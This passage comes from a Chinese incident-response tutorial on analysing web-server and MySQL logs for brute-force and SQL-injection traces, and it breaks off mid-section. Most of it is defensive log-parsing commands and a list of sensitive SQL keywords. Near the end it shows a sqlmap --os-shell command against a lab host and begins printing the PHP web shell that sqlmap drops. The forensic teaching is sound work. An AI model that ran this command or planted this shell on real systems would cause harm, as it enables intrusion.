+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span>  <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span><span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $7}&#39;</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">more</span></span></span></code></pre></div><p>文件流量统计：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span><span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}&#39;</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">more</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">grep</span> <span style="color:#a6be9d">&#39; 200 &#39;</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span><span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}&#39;</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">more</span></span></span></code></pre></div><p>URL访问量统计：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $7}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">egrep</span> <span style="color:#a6be9d">&#39;\?|&amp;&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">more</span></span></span></code></pre></div><p>脚本运行速度：</p>
+<p>查出运行速度最慢的脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">grep</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">v</span> <span style="color:#a6be9d">0</span><span style="color:#58a1dd">$</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">F</span> <span style="color:#a6be9d">&#39;\&#34; &#39;</span> <span style="color:#a6be9d">&#39;{print $4&#34; &#34; $1}&#39;</span> <span style="color:#58a1dd">web</span>.<span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $1&#34; &#34;$8}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">k</span> <span style="color:#a6be9d">1</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">&gt;</span> /tmp/slow_url.txt</span></span></code></pre></div><p>IP, URL 抽取：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>##### <span style="color:#58a1dd">tail</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">f</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">grep</span> <span style="color:#a6be9d">&#39;/test.html&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $1&#34; &#34;$7}&#39;</span></span></span></code></pre></div><h6 id="nginx" class="heading-element"><span>0.0.0.2.2  nginx</span>
+  <a href="#nginx" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>两种主要的日志类型：access log和error log。access log记录了每个用户请求的详细信息，如时间、IP地址、URL、状态码等；error log记录了服务器运行过程中遇到的错误或警告信息，如配置问题、连接问题等。</p>
+<p>Nginx日志的存放位置可以在nginx.conf文件中配置，一般默认为/usr/local/nginx/logs或/var/log/nginx目录下。例如：</p>
+<p>access_log /usr/local/nginx/logs/access.log;</p>
+<p>error_log /usr/local/nginx/logs/error.log;</p>
+<h6 id="iis" class="heading-element"><span>0.0.0.2.3  IIS</span>
+  <a href="#iis" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>IIS日志的存放位置可以在Internet Information Services (IIS) Manager中配置，一般默认为%SystemRoot%\System32\LogFiles目录下。例如：
+留言</p>
+<p>%SystemRoot%\System32\LogFiles\W3SVC1
+%SystemRoot%\System32\LogFiles\HTTPERR</p>
+<h5 id="数据库日志" class="heading-element"><span>0.0.0.3  数据库日志</span>
+  <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%97%a5%e5%bf%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="mysql" class="heading-element"><span>0.0.0.3.1  Mysql</span>
+  <a href="#mysql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
+<p>####### 常用命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####有哪些IP在爆破？</span>
+</span></span><span style="display:flex;"><span>grep  <span style="color:#a6be9d">&#34;Access denied&#34;</span> mysql.log |cut -d <span style="color:#a6be9d">&#34;&#39;&#34;</span> -f4|uniq -c|sort -nr
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">27</span> 192.168.204.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####爆破用户名字典都有哪些？</span>
+</span></span><span style="display:flex;"><span>grep  <span style="color:#a6be9d">&#34;Access denied&#34;</span> mysql.log |cut -d <span style="color:#a6be9d">&#34;&#39;&#34;</span> -f2|uniq -c|sort -nr
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">13</span> mysql
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">12</span> root
+</span></span><span style="display:flex;"><span>      <span style="color:#a6be9d">1</span> root
+</span></span><span style="display:flex;"><span>      <span style="color:#a6be9d">1</span> mysql
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>查看MySQL中已加载的插件以及相关配置信息   
+</span></span><span style="display:flex;"><span>show variables like <span style="color:#a6be9d">&#39;%plugin%&#39;</span>;
+</span></span><span style="display:flex;"><span>   </span></span></code></pre></div><p>####### 查看日志</p>
+<p>位置</p>
+<p>错误日志 (Error Log)</p>
+<p>错误日志记录了 MySQL 服务器启动和关闭的消息，以及在运行过程中遇到的错误。</p>
+<ul>
+<li>默认位置：
+<ul>
+<li>在 Linux 上，通常位于 <code>/var/log/mysql/error.log</code> 或 <code>/var/log/mysqld.log</code>。</li>
+<li>在 Windows 上，通常位于 MySQL 安装目录下的 <code>data</code> 目录中。</li>
+</ul>
+</li>
+</ul>
+<p>可以通过以下命令在 MySQL 控制台中查看当前的日志文件位置：</p>
+<ul>
+<li>
+<p>错误日志位置：</p>
+<pre tabindex="0"><code>SHOW VARIABLES LIKE &#39;log_error&#39;;</code></pre></li>
+<li>
+<p>查询日志位置：</p>
+<pre tabindex="0"><code>SHOW VARIABLES LIKE &#39;general_log_file&#39;;</code></pre></li>
+<li>
+<p>慢查询日志位置：</p>
+<pre tabindex="0"><code>SHOW VARIABLES LIKE &#39;slow_query_log_file&#39;;</code></pre></li>
+<li>
+<p>二进制日志位置：</p>
+<pre tabindex="0"><code>SHOW VARIABLES LIKE &#39;log_bin_basename&#39;;</code></pre></li>
+</ul>
+<p>找配置文件</p>
+<pre tabindex="0"><code>sudo find / -name my.cnf
+sudo find / -name my.ini</code></pre><p>####### 0x01 Mysql日志分析</p>
+<p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>1、查看log配置信息
+</span></span><span style="display:flex;"><span>show variables like <span style="color:#a6be9d">&#39;%general%&#39;</span>;
+</span></span><span style="display:flex;"><span>2、开启日志
+</span></span><span style="display:flex;"><span>SET GLOBAL <span style="color:#58a1dd">general_log</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;On&#39;</span>;
+</span></span><span style="display:flex;"><span>3、指定日志文件路径
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####SET GLOBAL general_log_file = &#39;/var/lib/mysql/mysql.log&#39;;</span></span></span></code></pre></div><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">190604</span> 14:46:14       <span style="color:#a6be9d">14</span> Connect    root@localhost on 
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">14</span> Init DB    <span style="color:#58a1dd">test</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">14</span> Query    SELECT * FROM admin WHERE <span style="color:#58a1dd">id</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">14</span> Quit  <span style="color:#a6be9d">`</span></span></span></code></pre></div><p>我们按列来解析一下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
+</span></span><span style="display:flex;"><span>第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
+</span></span><span style="display:flex;"><span>第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库<span style="color:#ff636f">(</span>增删查改都显示为查询<span style="color:#ff636f">)</span>，可以特定过虑一些操作。
+</span></span><span style="display:flex;"><span>第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span></span></code></pre></div><p>####### 0x02 登录成功/失败</p>
+<p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191525722.webp" alt="image-20240719152556596" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191525722.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191525722.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191525722.webp?size=large 2x" data-title="image-20240719152556596" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>MySQL中的log记录是这样子：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Time                 Id        Command         Argument
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">190601</span> 22:03:20       <span style="color:#a6be9d">98</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">98</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;root&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">103</span> Connect    mysql@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">103</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;mysql&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">104</span> Connect    mysql@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">104</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;mysql&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">100</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">101</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">101</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;root&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">99</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>           <span style="color:#a6be9d">99</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;root&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">105</span> Connect    mysql@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">105</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;mysql&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">100</span> Query    <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">autocommit</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">102</span> Connect    mysql@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">102</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;mysql&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6be9d">100</span> Quit    <span style="color:#a6be9d">`</span></span></span></code></pre></div><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
+<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">190601</span> 22:03:20     <span style="color:#a6be9d">100</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>       <span style="color:#a6be9d">100</span> Query    <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">autocommit</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#a6be9d">100</span> Quit</span></span></code></pre></div><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
+<p>Navicat for MySQL登录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">190601</span> 22:14:07      <span style="color:#a6be9d">106</span> Connect    root@192.168.204.1 on 
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6be9d">106</span> Query    SET NAMES utf8
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6be9d">106</span> Query    SHOW VARIABLES LIKE <span style="color:#a6be9d">&#39;lower_case_%&#39;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6be9d">106</span> Query    SHOW VARIABLES LIKE <span style="color:#a6be9d">&#39;profiling&#39;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6be9d">106</span> Query    SHOW DATABASES</span></span></code></pre></div><p>命令行登录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">190601</span> 22:17:25      <span style="color:#a6be9d">111</span> Connect    root@localhost on 
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6be9d">111</span> Query    <span style="color:#ff636f">select</span> @@version_comment limit <span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">190601</span> 22:17:56      <span style="color:#a6be9d">111</span> Quit</span></span></code></pre></div><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
+<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
+<p>登录失败的记录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">102</span> Connect    mysql@192.168.204.1 on 
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">102</span> Connect    Access denied <span style="color:#ff636f">for</span> user <span style="color:#a6be9d">&#39;mysql&#39;</span>@<span style="color:#a6be9d">&#39;192.168.204.1&#39;</span> <span style="color:#ff636f">(</span>using password: YES<span style="color:#ff636f">)</span></span></span></code></pre></div><p>利用shell命令进行简单的分析：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####有哪些IP在爆破？</span>
+</span></span><span style="display:flex;"><span>grep  <span style="color:#a6be9d">&#34;Access denied&#34;</span> mysql.log |cut -d <span style="color:#a6be9d">&#34;&#39;&#34;</span> -f4|uniq -c|sort -nr
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">27</span> 192.168.204.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####爆破用户名字典都有哪些？</span>
+</span></span><span style="display:flex;"><span>grep  <span style="color:#a6be9d">&#34;Access denied&#34;</span> mysql.log |cut -d <span style="color:#a6be9d">&#34;&#39;&#34;</span> -f2|uniq -c|sort -nr
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">13</span> mysql
+</span></span><span style="display:flex;"><span>     <span style="color:#a6be9d">12</span> root
+</span></span><span style="display:flex;"><span>      <span style="color:#a6be9d">1</span> root
+</span></span><span style="display:flex;"><span>      <span style="color:#a6be9d">1</span> mysql</span></span></code></pre></div><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
+<p>敏感数据库表：SELECT <em>from mysql.user、SELECT</em> from mysql.func</p>
+<p>####### 0x03 SQL注入入侵痕迹</p>
+<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的&ndash;os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
+<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap.py -u http://192.168.204.164/sql.php?id<span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span> --os-shell --proxy<span style="color:#ff636f">=</span>http://127.0.0.1:8080</span></span></code></pre></div><p>HTTP通讯过程如下：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526521.webp" alt="image-20240719152613341" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526521.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526521.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407191526521.webp?size=large 2x" data-title="image-20240719152613341" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
+<p>tmpbwyov.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_REQUEST</span>[<span style="color:#a6be9d">&#34;cmd&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">@</span><span style="color:#58a1dd">set_time_limit</span>(<span style="color:#a6be9d">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">@</span><span style="color:#58a1dd">ignore_user_abort</span>(<span style="color:#a6be9d">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">@</span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;max_execution_time&#39;</span>, <span style="color:#a6be9d">0</span>);
+</span></span><span style="display:flex;"><span>
